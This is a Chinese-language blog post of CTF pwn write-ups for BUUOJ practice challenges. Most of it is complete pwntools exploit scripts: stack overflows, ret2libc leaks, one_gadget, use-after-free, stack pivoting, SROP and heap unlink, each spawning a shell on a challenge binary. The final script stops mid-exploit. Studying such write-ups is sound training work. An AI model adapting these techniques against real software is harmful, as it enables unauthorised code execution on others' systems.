<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">






  <meta name="keywords" content="pwn," />










<meta name="description" content="在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题同类型的题只记录一次有一些觉得比较典型的题，单独写，在此处贴链接主要看心情">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUOJ pwn(不定期更新)">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2099&#x2F;12&#x2F;12&#x2F;BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0&#x2F;index.html">
<meta property="og:site_name" content="N0vice&#39;s Blog">
<meta property="og:description" content="在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题同类型的题只记录一次有一些觉得比较典型的题，单独写，在此处贴链接主要看心情">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2099&#x2F;12&#x2F;12&#x2F;BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0&#x2F;bjdctf_2020_babystack2_1.png">
<meta property="article:published_time" content="2099-12-12T03:37:00.000Z">
<meta property="article:modified_time" content="2020-05-30T09:10:33.158Z">
<meta property="article:author" content="N0vice">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2099&#x2F;12&#x2F;12&#x2F;BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0&#x2F;bjdctf_2020_babystack2_1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2099/12/12/BUUOJ-pwn-不定期更新/"/>





  <title>BUUOJ pwn(不定期更新) | N0vice's Blog</title>
  








<meta name="generator" content="Hexo 4.1.0"></head>
<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
<script src="/live2d-widget/autoload.js"></script>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">N0vice's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2099/12/12/BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="N0vice">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N0vice's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">BUUOJ pwn(不定期更新)</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2099-12-12T11:37:00+08:00">
                2099-12-12
              </time>
            
            
            <i class="fa fa-thumb-tack"></i>
            <font color=7D26CD>置顶</font>
            <span class="post-meta-divider">|</span>
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>在buuoj平台上做题的记录，一般情况下只记录能学到新东西的题<br>同类型的题只记录一次<br>有一些觉得比较典型的题，单独写，在此处贴链接<br>主要看心情  </p>
<a id="more"></a>
<h2 id="0x01-rip覆盖一下"><a href="#0x01-rip覆盖一下" class="headerlink" title="0x01 rip覆盖一下"></a>0x01 rip覆盖一下</h2><pre><code class="Python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
context.log_level = <span class="string">'debug'</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27714</span>)
payload = <span class="string">"a"</span>*<span class="number">23</span> + p64(<span class="number">0x40118A</span>)
p.sendline(payload)
p.interactive()</code></pre>
<h2 id="0x02-warmup-csaw-2016"><a href="#0x02-warmup-csaw-2016" class="headerlink" title="0x02 warmup_csaw_2016"></a>0x02 warmup_csaw_2016</h2><pre><code class="Python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
elf=ELF(<span class="string">"./warmup_csaw_2016"</span>)
<span class="comment">#p=process("./warmup_csaw_2016")</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26890</span>)
p.recvuntil(<span class="string">"&gt;"</span>)
payload = <span class="string">"a"</span>*<span class="number">72</span> + p64(<span class="number">0x40060D</span>)
p.sendline(payload)
sleep(<span class="number">0.1</span>)
p.interactive()</code></pre>
<h2 id="0x03-ciscn-2019-n-1"><a href="#0x03-ciscn-2019-n-1" class="headerlink" title="0x03  ciscn_2019_n_1"></a>0x03  ciscn_2019_n_1</h2><p>很典型的64位ret2libc  </p>
<pre><code class="Python"><span class="comment"># -*- coding: utf-8 -*-</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29434</span>)
p=process(<span class="string">'./ciscn_2019_n_1'</span>)
elf=ELF(<span class="string">'./ciscn_2019_n_1'</span>)
libc=ELF(<span class="string">'libc-2.27.so'</span>)

pop_rdi_ret = <span class="number">0x0000000000400793</span> 

payload = <span class="string">"a"</span>*<span class="number">0x38</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">'__libc_start_main'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'main'</span>])

p.recvuntil(<span class="string">"number.\n"</span>)
p.sendline(payload)

puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
<span class="keyword">print</span> <span class="string">"puts_addr:"</span> + hex(puts_addr)
offset = puts_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]
sys_addr = offset + libc.symbols[<span class="string">'system'</span>]
<span class="keyword">print</span> <span class="string">"sys_addr:"</span> + hex(sys_addr)
binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + offset
<span class="keyword">print</span> <span class="string">"binsh_addr:"</span> + hex(binsh_addr)

payload = <span class="string">"a"</span>*<span class="number">0x38</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

p.recvuntil(<span class="string">"number.\n"</span>)
p.sendline(payload)
<span class="comment">#sleep(0.1)</span>
p.interactive()</code></pre>
<p>如果在没有libc的情况下也可以把/bin/sh字符串写入一个段内去执行system(“/bin/sh”)  </p>
<pre><code class="Python"><span class="comment"># -*- coding: utf-8 -*-</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29434</span>)
p=process(<span class="string">'./ciscn_2019_n_1'</span>)
elf=ELF(<span class="string">'./ciscn_2019_n_1'</span>)
pop_rdi_ret = <span class="number">0x0000000000400793</span>
bss_start = elf.bss()
gets = elf.plt[<span class="string">'gets'</span>]
sys_addr = elf.plt[<span class="string">'system'</span>]
payload = <span class="string">"a"</span>*<span class="number">0x38</span> + p64(pop_rdi_ret) + p64(bss_start) + p64(gets) 
payload += p64(pop_rdi_ret) + p64(bss_start) + p64(sys_addr) 
p.sendline(payload)
p.sendline(<span class="string">"/bin/sh\x00"</span>)
p.interactive()</code></pre>
<h2 id="0x04-HarekazeCTF2019-baby-rop2"><a href="#0x04-HarekazeCTF2019-baby-rop2" class="headerlink" title="0x04  [HarekazeCTF2019]baby_rop2"></a>0x04  [HarekazeCTF2019]baby_rop2</h2><p>差点把babyrop做成了这题，后来才发现babyrop有/bin/sh字符串……<br>这题用了printf泄露__libc_start_main函数的地址，特别的地方在于布置printf的两个参数，是以前没有做过的。另外，one_gadget真香！</p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python2</span>
<span class="comment">#conding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25892</span>)
<span class="comment">#p = process("./babyrop2")</span>
elf = ELF(<span class="string">"./babyrop2"</span>)
libc = elf.libc
pop_rdi_ret = <span class="number">0x0000000000400733</span>
pop_rsi_r15 = <span class="number">0x0000000000400731</span>
string = <span class="number">0x400770</span>  <span class="comment">#printf的"%s"参数</span>

padding = <span class="string">"a"</span>*<span class="number">0x28</span>
payload = padding 
payload += p64(pop_rdi_ret) 
payload += p64(string) 
payload += p64(pop_rsi_r15) 
payload += p64(elf.got[<span class="string">'__libc_start_main'</span>])  <span class="comment"># 用__libc_start_main的got地址作为printf的第二个参数</span>
payload += <span class="string">"a"</span>*<span class="number">8</span>  <span class="comment"># 没有单独的pop_rsi_ret，所以r15里面要放一个垃圾值</span>
payload += p64(elf.plt[<span class="string">'printf'</span>]) 
payload += p64(elf.symbols[<span class="string">'main'</span>])
<span class="comment">#gdb.attach(p)</span>
p.sendline(payload)

__libc_start_main_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]
log.success(<span class="string">"__libc_start_main_addr==&gt;"</span> + hex(__libc_start_main_addr))
log.success(<span class="string">"base==&gt;"</span> + hex(base))

one_gadget = base + <span class="number">0x45216</span>
payload1 = padding + p64(one_gadget)
p.sendline(payload1)
p.interactive()</code></pre>
<h2 id="0x05-BWrqt–spwn"><a href="#0x05-BWrqt–spwn" class="headerlink" title="0x05 BWrqt–spwn"></a>0x05 BWrqt–spwn</h2><p>详见栈迁移学习文章<br><a href="https://lyp0000.github.io/2020/01/17/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">spwn</a>  </p>
<h2 id="0x06-bjdctf-2020-babystack2"><a href="#0x06-bjdctf-2020-babystack2" class="headerlink" title="0x06  bjdctf_2020_babystack2"></a>0x06  bjdctf_2020_babystack2</h2><p>先看一下main函数<br><img src="bjdctf_2020_babystack2_1.png" alt=""><br>可以看到read的最后一个参数是需要我们输入长度的，但是下面对于长度有一个if条件检测，不能大于10。但是我们需要让nbytes起码要大于0x10才能溢出。所以我们需要输入”-1”，输入-1的原因是因为read的最后一个参数是unsigned int类型，0是最小值，输入-1的话他会变成最大值，这个数字很大很大，必然能造成溢出，而且-1 &lt; 10 也能绕过if的检测，这题又学到了东西。<br>贴出exp  </p>
<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
<span class="comment">#p=remote("node3.buuoj.cn",27823)</span>
p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)
elf=ELF(<span class="string">"./bjdctf_2020_babystack2"</span>)
libc=elf.libc
padding = <span class="string">"a"</span>*<span class="number">0x10</span> + <span class="string">"a"</span>*<span class="number">8</span>
p.recvuntil(<span class="string">"name:\n"</span>)
p.sendline(<span class="string">"-1"</span>)
p.recvuntil(<span class="string">"name?\n"</span>)
payload = padding + p64(<span class="number">0x400726</span>)
p.sendline(payload)
p.interactive()  </code></pre>
<h2 id="0x07-hitcontraining-uaf"><a href="#0x07-hitcontraining-uaf" class="headerlink" title="0x07 hitcontraining_uaf"></a>0x07 hitcontraining_uaf</h2><p>UAF漏洞，修改小note的puts字段之后，只要执行print_note函数，就可以执行magic函数  </p>
<pre><code class="python"><span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
<span class="comment">#p=process("./hacknote")</span>
<span class="comment">#p=remote("node3.buuoj.cn",25290)</span>
elf=ELF(<span class="string">"./hacknote"</span>)
magic = <span class="number">0x8048986</span>

<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"size :"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"Content :"</span>)
    p.sendline(content)

<span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))

<span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))

add(<span class="number">16</span>,<span class="string">"aaa"</span>)
add(<span class="number">16</span>,<span class="string">"bbb"</span>)

delete(<span class="number">0</span>)
delete(<span class="number">1</span>)

add(<span class="number">8</span>,p32(magic))
view(<span class="number">0</span>)

p.interactive()</code></pre>
<h2 id="0x08-pwnable-hacknote"><a href="#0x08-pwnable-hacknote" class="headerlink" title="0x08 pwnable_hacknote"></a>0x08 pwnable_hacknote</h2><pre><code class="python"><span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
p=process(<span class="string">"./hacknote"</span>)
<span class="comment">#p=remote("node3.buuoj.cn",29406)</span>
elf=ELF(<span class="string">"./hacknote"</span>)
puts = <span class="number">0x804862B</span>

<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"size :"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"Content :"</span>)
    p.sendline(content)

<span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))

<span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice :"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"Index :"</span>)
    p.sendline(str(index))

add(<span class="number">16</span>,<span class="string">"aaa"</span>)
add(<span class="number">16</span>,<span class="string">"bbb"</span>)

delete(<span class="number">0</span>)
delete(<span class="number">1</span>)

add(<span class="number">8</span>,p32(puts)+p32(elf.got[<span class="string">'puts'</span>]))
view(<span class="number">0</span>)

puts_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])
libc = LibcSearcher(<span class="string">"puts"</span>,puts_addr)
offset = puts_addr - libc.dump(<span class="string">'puts'</span>)
system_addr = offset + libc.dump(<span class="string">'system'</span>)
log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
log.success(<span class="string">"system_addr==&gt;"</span> + hex(system_addr))

delete(<span class="number">2</span>)
add(<span class="number">8</span>,p32(system_addr)+<span class="string">";sh"</span>)
view(<span class="number">0</span>)

p.interactive()  </code></pre>
<h2 id="0x09-gyctf-2020-borrowstack"><a href="#0x09-gyctf-2020-borrowstack" class="headerlink" title="0x09 gyctf_2020_borrowstack"></a>0x09 gyctf_2020_borrowstack</h2><p>i春秋的抗击疫情公益赛，栈迁移，不是自己做出来的，挖坑待填……武汉加油！<br>据说执行完puts函数之后，read的got表被改写了，导致rip变成了0，所以需要往后挪挪位置……  </p>
<pre><code>因为迁移之后函数调用会让栈增高，表现出来的就是bss的低地址会被拿来放一些数据，所以read_got就被改了</code></pre><p>后面再补充，还没理解  </p>
<pre><code class="python"><span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
p=process(<span class="string">"./borrowstack"</span>)
<span class="comment">#p=remote("node3.buuoj.cn",26086)</span>
<span class="comment">#p=remote("123.56.85.29",3635)</span>
elf = ELF(<span class="string">"./borrowstack"</span>)
libc = elf.libc
leave_ret = <span class="number">0x400699</span>
pop_rdi_ret = <span class="number">0x400703</span>
pop_rsi_r15 = <span class="number">0x400701</span>
ret = <span class="number">0x00000000004004c9</span>
ret = p64(ret)
buf = elf.bss() + <span class="number">0x300</span>

p.recvuntil(<span class="string">"want\n"</span>)
p.send(<span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0x601080</span>) + p64(leave_ret))
p.recvuntil(<span class="string">"now!\n"</span>)
payload = p64(buf) +ret+ret+ret+ret+ret+ret+ p64(pop_rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) 
payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(buf) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>]) 
payload += p64(leave_ret)
<span class="comment">#gdb.attach(p)</span>
p.send(payload)

puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]
binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()
one_gadget = libc_base + <span class="number">0xf1147</span> 

p.send(p64(<span class="number">0xdeadbeef</span>) + p64(one_gadget))

p.interactive()
</code></pre>
<h2 id="0x10-ciscn-2019-es-7-ciscn-2019-s-3"><a href="#0x10-ciscn-2019-es-7-ciscn-2019-s-3" class="headerlink" title="0x10  ciscn_2019_es_7/ciscn_2019_s_3"></a>0x10  ciscn_2019_es_7/ciscn_2019_s_3</h2><p>SROP一把梭    </p>
<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
context.arch = <span class="string">'amd64'</span>
p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27476</span>)
<span class="comment">#p = process("./ciscn_2019_es_7")</span>
elf = ELF(<span class="string">"./ciscn_2019_es_7"</span>)
libc = ELF(<span class="string">"/home/N0vice/Desktop/BUUCTF/libc-2.27.so"</span>)
syscall_addr = <span class="number">0x0000000000400517</span>
st_sigreturn = <span class="number">0x00000000004004da</span>
main_addr = elf.symbols[<span class="string">'main'</span>]
<span class="comment">#gdb.attach(p)</span>
payload = <span class="string">"/bin/sh\x00"</span> + <span class="string">"\x00"</span>*<span class="number">8</span> + p64(<span class="number">0x4004EE</span>) 
p.send(payload)
p.recv(<span class="number">32</span>)
stack_addr = u64(p.recv(<span class="number">8</span>))
stack_addr = stack_addr - <span class="number">280</span>
log.success(<span class="string">'stack_addr==&gt;'</span> + hex(stack_addr))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr
frame.rsi = <span class="number">0</span>
frame.rdx = <span class="number">0</span>
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = <span class="string">"a"</span>*<span class="number">16</span> + p64(st_sigreturn) + p64(syscall_addr) + str(frame)
p.send(payload)
p.interactive()</code></pre>
<h2 id="0x11-hitcon2014-stkof"><a href="#0x11-hitcon2014-stkof" class="headerlink" title="0x11  hitcon2014_stkof"></a>0x11  hitcon2014_stkof</h2><p>unlink，通过从chunk_mem_addr的指针指向的地方开始修改，即从0x602138开始修改，然后将三个数组分别改成free_got,puts_got,atoi_got三个got表，然后再通过修改chunk1，把free_got改写为puts_plt，然后执行free函数就会泄露puts函数地址，最后改atoi函数的got为one_gadget，只要输入选项就会执行atoi函数，即执行one_gadget  </p>
<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
context.arch = <span class="string">'amd64'</span>
<span class="comment">#p=remote("node3.buuoj.cn",25166)</span>
p = process(<span class="string">"./stkof"</span>)
elf = ELF(<span class="string">"./stkof"</span>)
libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
bss = <span class="number">0x602140</span> + <span class="number">0x10</span>
free_got=elf.got[<span class="string">'free'</span>]
puts_got=elf.got[<span class="string">'puts'</span>]
atoi_got=elf.got[<span class="string">'atoi'</span>]
puts_plt=elf.plt[<span class="string">'puts'</span>]
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span>
    p.sendline(<span class="string">"1"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"OK\n"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span>
    p.sendline(<span class="string">"3"</span>)
    p.sendline(str(idx))
<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span>
    p.sendline(<span class="string">"2"</span>)
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil(<span class="string">"OK\n"</span>)

add(<span class="number">0x10</span>)
add(<span class="number">0x30</span>)
add(<span class="number">0x80</span>)

payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(bss<span class="number">-0x18</span>) + p64(bss<span class="number">-0x10</span>)
payload += <span class="string">"a"</span>*<span class="number">0x10</span>
payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)

edit(<span class="number">2</span>,len(payload),payload)
free(<span class="number">3</span>)
p.recvuntil(<span class="string">'OK\n'</span>)
payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(free_got) + p64(puts_got) + p64(atoi_got) 
edit(<span class="number">2</span>,len(payload),payload)
gdb.attach(p)
payload = p64(puts_plt)
edit(<span class="number">1</span>,len(payload),payload)
<span class="comment">#gdb.attach(p)</span>
free(<span class="number">2</span>)

puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))
log.success(<span class="string">'puts addr: '</span>+hex(puts_addr))
libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]
log.success(<span class="string">'libc_base: '</span>+hex(libc_base))
one_gadget = libc_base + <span class="number">0x4526a</span>
payload = p64(one_gadget)
edit(<span class="number">3</span>,len(payload),payload)
p.interactive()</code></pre>
<h2 id="0x12-actf-2019-babystack"><a href="#0x12-actf-2019-babystack" class="headerlink" title="0x12  actf_2019_babystack"></a>0x12  actf_2019_babystack</h2><p>栈迁移，溢出只能控制到eip，然后题中会泄露栈地址，我们用泄露出的栈地址吧rbp覆盖掉，然后rip指向leave_ret，栈就会迁移到上面read读进去的地方，然后在read读进去的地方执行我们的rop链</p>
<pre><code class="Python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
<span class="comment">#p=remote("node3.buuoj.cn",25727)</span>
p=process(<span class="string">"./ACTF_2019_babystack"</span>)
elf=ELF(<span class="string">"./ACTF_2019_babystack"</span>)
libc=ELF(<span class="string">"/home/N0vice/Desktop/BUUCTF/libc-2.27.so"</span>)
<span class="comment">#libc=elf.libc</span>
leave_ret = <span class="number">0x0000000000400a18</span>
pop_rdi_ret = <span class="number">0x0000000000400ad3</span>
p.recvuntil(<span class="string">"?\n"</span>)
p.sendline(<span class="string">"224"</span>)
p.recvuntil(<span class="string">'saved at'</span>)
p.recvuntil(<span class="string">"0x"</span>)
stack_addr = int(p.recvline(),<span class="number">16</span>)
<span class="comment">#stack_addr = int((p.recvline_contains('0x7f')),16)</span>
log.success(<span class="string">"stack_addr==&gt;"</span> + hex(stack_addr))

payload = p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(<span class="number">0x4008F6</span>) <span class="comment"># main_addr</span>
payload += <span class="string">"a"</span>*(<span class="number">0xD0</span> - len(payload))
payload += p64(stack_addr) + p64(leave_ret)
p.recvuntil(<span class="string">'&gt;'</span>)
p.send(payload)

puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) <span class="comment"># leak puts_addr</span>
